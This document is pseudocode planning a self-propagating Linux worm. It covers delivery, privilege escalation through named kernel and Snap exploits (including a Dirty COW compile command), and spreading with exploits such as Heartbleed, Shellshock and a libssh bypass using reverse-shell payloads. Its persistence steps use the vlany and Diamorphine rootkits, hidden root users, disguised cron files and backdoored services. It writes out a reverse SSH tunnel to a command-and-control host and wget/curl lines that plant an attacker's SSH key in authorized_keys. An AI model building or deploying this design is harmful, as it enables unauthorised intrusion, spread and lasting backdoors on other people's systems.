###########PSUEDOCODE############

Linux:
- File is compiled to .elf or .exe before delivery
- Malicious shell script is executed and downloads WORM + dependencies
- Worm is executed on victim pc
- Worm analyzes current environment and resources
    - Gets public and private IP
    - Gets list of available hosts
- Worm escalates privileges
- Worm begins executing persistence
- Worm executes spreading

-----------SPREADING-------------
1) Scans all hosts in current subnet for target ports
2) Verify that host is vulnerable to an available exploit
3) Fire exploit at vulnerable hosts with a reverse shell payload
4) Pass shell to propagate class to escalate privileges (QUIETLY)
5) Apply persistence
6) Repeat 1-5 for all hosts

-----------PRIV ESC-------------
- Dirty Sock    - (Snap)
- Full-Nelson   - Kernel 2.6.37 <= 'Full-Nelson.c' (RedHat/Ubuntu 10.04)
- CVE-2010-3904 - Kernel <=2.6.36-rc8 (RDS protocol)

    - https://dirtycow.ninja/
    - Compile:  g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil

--------Exploits----------
- Libssh Authentication Bypass
- Heartbleed (CVE-2014-0160)
- Shellshock

----------PERSISTENCE----------
- Can we install vlany?
    - Install vlany, with a hidden root user and ssh server
    - Use vlany for everything persistence related
    - break
- Can we install Diamorphine?
    - Install Diamorphine, create hidden directory
    - Use Diamorphine for persistence
    -break
- Is there currently a SSH server?
    - reverse ssh connection to host for communication
        - ssh -Ntf -R 22:localhost:2222 myhost@myc2
            - SSH key persistence:
                - Do we have wget?
                    - echo $(wget https://my_ip/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
                - Do we have curl?
                    - echo $(curl https://my_ip/.ssh/id_rsa.pub -O id_rsa.pub >> ~/.ssh/authorized_keys
                - Add to authorized hosts
- Do we need to add a new user?
- Is cron available?
    - Create hidden crontab (/etc/cron.d/systemd-Zero)
- Is systemd available?
    - Create system service
- Does the system use service?
    - Infect a current running service
- RC local?
- Backdoor user's bashrc?
